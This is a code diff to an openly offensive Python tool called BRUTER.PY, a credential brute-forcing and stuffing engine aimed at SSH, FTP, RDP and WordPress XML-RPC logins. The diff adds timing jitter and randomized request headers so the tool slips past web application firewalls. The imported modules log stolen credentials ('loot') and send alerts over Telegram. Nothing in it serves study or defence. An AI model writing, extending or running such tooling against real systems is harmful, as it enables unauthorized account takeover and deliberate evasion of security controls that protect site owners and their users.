@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTER.PY — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine v8.0 (With Telegram Telemetry)
+BRUTER.PY v8.5 — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine (WAF Hardened)
 Features:
 - High-aggression SSH, FTP, and RDP credential brute-forcing
 - WordPress XML-RPC brute-force amplification attacks
@@ -21,6 +21,7 @@ import sys
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 # ============================================================
 # CONFIGURATION & DEFAULT CREDENTIAL LISTS
@@ -96,6 +97,7 @@ def normalize_host(target):
 # TCP CONNECTION
 # ============================================================
 async def tcp_connect(host, port):
+    apply_behavioral_jitter()
     try:
         reader, writer = await asyncio.wait_for(
             asyncio.open_connection(host, port),
@@ -302,13 +304,16 @@ async def assault_wordpress_target(host, credentials=None):
 </methodCall>"""
 
     def perform_request():
+        apply_behavioral_jitter()
+        headers = {
+            "User-Agent": "BruteDog-Offensive-Bruter/8.5",
+            "Content-Type": "text/xml",
+        }
+        headers.update(get_randomized_hints())
         request = urllib.request.Request(
             xmlrpc_url,
             data=payload.encode("utf-8"),
-            headers={
-                "User-Agent": "BruteDog-Offensive-Bruter/8.0",
-                "Content-Type": "text/xml",
-            },
+            headers=headers,
             method="POST",
         )
         try:
